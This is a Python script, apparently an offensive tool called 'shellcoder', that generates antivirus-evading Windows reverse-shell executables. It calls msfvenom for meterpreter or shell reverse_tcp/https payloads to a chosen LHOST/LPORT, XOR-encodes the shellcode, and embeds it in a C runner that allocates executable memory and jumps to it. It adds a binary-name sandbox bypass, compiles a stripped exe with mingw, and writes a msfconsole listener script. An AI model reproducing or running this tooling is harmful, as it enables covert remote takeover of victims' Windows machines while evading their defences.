#!/usr/bin/env python3
import os
import random
import socket
import string
import subprocess

import emoji
import psutil
from art import aprint
from termcolor import cprint, colored


def intro():
    from art import text2art
    print(text2art("shellcoder", "graffiti"))
    print((emoji.emojize(":zany_face:") * 36))
    print(emoji.emojize(":zany_face:") + " " * 68 + emoji.emojize(":zany_face:"))
    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/EnginDemirbilek/Flip" + " " * 10 + emoji.emojize(
        ":zany_face:"))
    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte" + " " * 10 + emoji.emojize(
        ":zany_face:"))
    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper" + " " * 5 + emoji.emojize(
        ":zany_face:"))
    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " All the guys everywhere" + " " * 37 + emoji.emojize(":zany_face:"))
    print(emoji.emojize(":zany_face:") + " " * 68 + emoji.emojize(":zany_face:"))
    print((emoji.emojize(":zany_face:") * 36))


class Bypass:
    func_name = None

    def __init__(self):
        self.func_name = ShellCoder.make_random_str()

    def get_template(self):
        raise NotImplemented()

    def get_import(self):
        raise NotImplemented()


class VerifyInputName(Bypass):
    binary_name = None

    def __init__(self):
        super().__init__()
        self.binary_name = self.ask_for_binary_name()
        self.arg_name = ShellCoder.make_random_str()

    @staticmethod
    def menu():
        return "Verify the binary name"

    def get_template(self):
        return '''
        
int {func_name}(const char *{arg_name}) {{
    if (strstr({arg_name}, "{binary_name}") == NULL) {{
        return 0; 
    }}
    
    return 1;
}}
        
        '''.format(
            func_name=self.func_name,
            arg_name=self.arg_name,
            binary_name=self.binary_name)

    def get_call(self):
        return '''
        {func_name}(argv[0]) == 1
        '''.format(
            func_name=self.func_name,
            arg_name=self.arg_name,
            binary_name=self.binary_name)

    @staticmethod
    def ask_for_binary_name():
        print("What is the name of result binary (without extension)?")
        binary_name = input(" name ?")
        return binary_name


class ShellCoder:
    arch_output = None
    arch_payload = None
    output_path = None
    exit_func = None
    commands = []
    selected_bypass = []
    shellcode_path = None
    template_path = None

    ARCH_X64 = 1
    ARCH_X86 = 2

    STAGED_PAYLOAD = 1
    NON_STAGED_PAYLOAD = 2

    def write_template(self, template_as_string):
        with open(self.template_path, 'w') as f:
            f.write(template_as_string)

    @staticmethod
    def make_random_str():
        nbr = random.randint(8, 35)
        random_str = ''.join(random.choice(string.ascii_letters) for i in range(nbr))
        return random_str

    @staticmethod
    def ask_arch():
        selected_arch = None

        print("What type of architecture for output binary?")

        while selected_arch is None:
            print(" - [1] x64")
            print(" - [2] x86")

            selected_arch = input(" ? - ")

            if selected_arch == '1':
                selected_arch = ShellCoder.ARCH_X64
            elif selected_arch == '2':
                selected_arch = ShellCoder.ARCH_X86
            else:
                selected_arch = None

        return selected_arch

    @staticmethod
    def ask_ip_address():
        selected_answer = None
        selected_ip = None

        ips = []
        for interface in psutil.net_if_addrs().values():
            for addr in interface:
                if addr.family == socket.AF_INET:
                    ips.append(addr.address)

        while selected_answer is None:
            print("What LHOST do you want ?")

            for i, ip_address in enumerate(ips):
                print("- [%s] %s" % ((i + 1), ip_address))

            try:
                selected_answer = input(" ?")
                selected_answer = int(selected_answer) - 1
                selected_ip = ips[selected_answer]
                break
            except ValueError:
                selected_answer = None
            except IndexError:
                selected_answer = None

        return selected_ip

    @staticmethod
    def ask_lport():
        selected_port = None
        while selected_port is None:
            print("Which port use?")
            selected_port = input(" ?")
            try:
                selected_port = int(selected_port)
            except ValueError:
                selected_port = None

        return selected_port

    @staticmethod
    def ask_for_exit_func():
        selected_answer = None

        print("What kind of EXIT Function do you want to use?")

        while selected_answer is None:
            print(" - [1] process")
            print(" - [2] thread")
            print(" - [3] SEH")

            selected_answer = input(" ? - ")

            if selected_answer == '1':
                selected_answer = "process"

            elif selected_answer == '2':
                selected_answer = "thread"

            elif selected_answer == '3':
                selected_answer = "seh"

            else:
                selected_answer = None

        return selected_answer

    @staticmethod
    def ask_out_path():
        selected_answer = None
        print("Or save the result binary?")

        while selected_answer is None:
            selected_answer = input(" ? -")
            is_exist = os.path.exists(selected_answer)

            if is_exist is False:
                print("Out pas does not exist")
                selected_answer = None

        return selected_answer

    def __init__(self):
        self.selected_ip = self.ask_ip_address()
        self.selected_port = self.ask_lport()
        self.exit_func = self.ask_for_exit_func()
        self.output_path = self.ask_out_path()
        self.arch_output = self.ask_arch()


class Windows(ShellCoder):
    exe_name = None
    payload = None
    injection_technique = None
    available_bypass = [VerifyInputName]

    def __init__(self):
        self.injection_technique = self.ask_for_technique()
        self.payload = self.ask_for_payload()
        super().__init__()
        self.gen_shellcode()
        self.selected_bypass = self.ask_for_bypass()
        self.gen_template()
        self.compile_payload()

    def gen_shellcode(self):
        self.shellcode_path = "%s/shellcode.raw" % self.output_path
        process_run = [
            'msfvenom', '-p', self.payload,
            'LHOST=%s' % self.selected_ip,
            'LPORT=%s' % self.selected_port,
            'EXITFUNC=%s' % self.exit_func,
            '-a', 'x64' if 'x64' in self.payload else 'x86',
            'f', 'raw',
            '-o', self.shellcode_path
        ]
        command = ' '.join(process_run)
        print(command)

        generate_script = """#!/bin/bash

{command}
               """.format(command=command)

        with open("%s/generate.sh" % self.output_path, 'w') as f:
            f.write(generate_script)

        listener_command = "msfconsole -q -x 'use multi/handler; set payload %s, set LHOST %s; set LPORT %s; set EXITFUNC %s;exploit'" % (self.payload, self.selected_ip, self.selected_port, self.exit_func)

        generate_script = """#!/bin/bash

{command}
                       """.format(command=listener_command)

        with open("%s/listener.sh" % self.output_path, 'w') as f:
            f.write(generate_script)

        subprocess.run(process_run)



    def xor_shellcode(self, data, key):
        key_len = len(key)
        key_as_int = list(map(ord, key))
        s = bytes(bytearray((
            (data[i] ^ key_as_int[i % key_len]) for i in range(0, len(data))
        )))
        shellcode = "\\x"
        shellcode += "\\x".join(format(b if isinstance(b, int) else ord(b), '02x') for b in s)
        return shellcode

    def open_shellcode(self, x_key):
        with open(self.shellcode_path, "rb") as raw_shellcode:
            return self.xor_shellcode(bytearray(raw_shellcode.read()), x_key)

    def shellcode_runner_template(self, bypass_functions, bypass_calls):
        xor_var = self.make_random_str()
        xor_key = self.make_random_str()
        shellcode_var = self.make_random_str()
        counter_var = self.make_random_str()
        increment_var = self.make_random_str()
        v_alloc_var = self.make_random_str()
        shellcode = self.make_random_str()
        encoded_shellcode = self.open_shellcode(xor_key)
        return """#include <windows.h>
#include <string>
using namespace std;

{bypass_functions}

int main(int argc, char **argv) {{

if ({bypass_calls}) {{
    char {xor_var}[] = "{xor_key}";
    char {shellcode_var}[] = "{encoded_shellcode}";
    char {shellcode}[sizeof {shellcode_var}];
    
    int {counter_var} = 0;
    for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
        if({counter_var} == sizeof {xor_var} -1) {{
            {counter_var}=0;
        }}
        {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
        {counter_var}++;
    }}

    void *{v_alloc_var} = VirtualAlloc(0, sizeof {shellcode}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy({v_alloc_var}, {shellcode}, sizeof {shellcode});
    ((void(*)()){v_alloc_var})();
 }}
}}
        """.format(
            bypass_functions=bypass_functions,
            bypass_calls=bypass_calls,
            xor_var=xor_var,
            xor_key=xor_key,
            shellcode_var=shellcode_var,
            counter_var=counter_var,
            increment_var=increment_var,
            v_alloc_var=v_alloc_var,
            shellcode=shellcode,
            encoded_shellcode=encoded_shellcode
        )

    @staticmethod
    def ask_for_payload():
        selected_answer = None
        selected_payload = None

        payloads = [
            'windows/x64/meterpreter/reverse_https',
            'windows/x64/meterpreter/reverse_tcp',
            'windows/x64/shell/reverse_https',
            'windows/x64/shell/reverse_tcp',
            'windows/meterpreter/reverse_https',
            'windows/meterpreter/reverse_tcp',
            'windows/shell/reverse_https',
            'windows/shell/reverse_tcp',
        ]

        print("What kind of payload do you want to use?")

        while selected_answer is None:
            for i, payload in enumerate(payloads):
                print("- [%s] %s" % ((i + 1), payload))

            try:
                selected_answer = input(" ?")
                selected_answer = int(selected_answer) - 1
                selected_payload = payloads[selected_answer]
                break
            except ValueError:
                selected_answer = None
            except IndexError:
                selected_answer = None

        return selected_payload

    @staticmethod
    def ask_for_technique():
        selected_answer = None

        while selected_answer is None:
            print("What technique do you want user")

            print(" [1] - shellcode runner")
            print(" [2] - process injection")

            selected_answer = input(" ? - ")

            if selected_answer not in ("1", "2"):
                selected_answer = None

        return selected_answer

    def ask_for_bypass(self):
        select_answer = None
        select_bypass = []

        while select_answer is None:
            print("Choose how bypass AV (value separate by comma (eg: 1,3,4")

            for i, bypass in enumerate(self.available_bypass):
                print("[%s] %s" % ((i + 1), bypass.menu()))

            select_answer = input('?')
            try:
                select_bypass = [self.available_bypass[int(c) - 1] for c in select_answer.split(',')]
            except ValueError:
                select_answer = None
            except IndexError:
                select_answer = None

        return select_bypass

    def gen_bypass(self):
        bypass_functions = []
        bypass_calls = []

        for bypass in self.selected_bypass:
            b = bypass()
            bypass_functions.append(b.get_template())
            bypass_calls.append(b.get_call())

        return '\n\n'.join(bypass_functions), ' && '.join(bypass_calls)

    def gen_template(self):
        bypass_functions, bypass_calls = self.gen_bypass()
        template = self.shellcode_runner_template(bypass_functions, bypass_calls)
        self.template_path = "%s/template.c" % self.output_path
        self.write_template(template)

    def compile_payload(self):
        if self.arch_output == ShellCoder.ARCH_X86:
            command = 'i686-w64-mingw32-g++ %s -o %s/shellcoder.exe -lws2_32' % (self.template_path, self.output_path)
        else:
            command = 'x86_64-w64-mingw32-g++ %s -o %s/shellcoder.exe' % (self.template_path, self.output_path)

        command += ' -s ' \
                   '-fomit-frame-pointer ' \
                   '-fno-unwind-tables  ' \
                   '-ffunction-sections ' \
                   '-fno-ident ' \
                   '-fdata-sections ' \
                   '-Wno-write-strings ' \
                   '-fno-exceptions ' \
                   '-fmerge-all-constants ' \
                   '-static-libstdc++ ' \
                   '-static-libgcc ' \
                   '-Wl,--gc-sections'

        compile_script = """
#!/bin/bash

{command}
        
        """.format(command=command.replace("%s/" % self.output_path, './'))

        with open("%s/compile.sh" % self.output_path, 'w') as f:
            f.write(compile_script)

        os.system(command)



class Linux:
    pass


if '__main__' == __name__:
    intro()
    print()
    cprint("What kind of target is it?", "blue", "on_white")
    print()
    print(" - [1] Windows ")
    print(" - [2] Linux ")
    target = input(" ? ")
    if target == '1':
        win = Windows()
    elif target == '2':
        Linux()
    else:
        raise Exception("Unknown target")
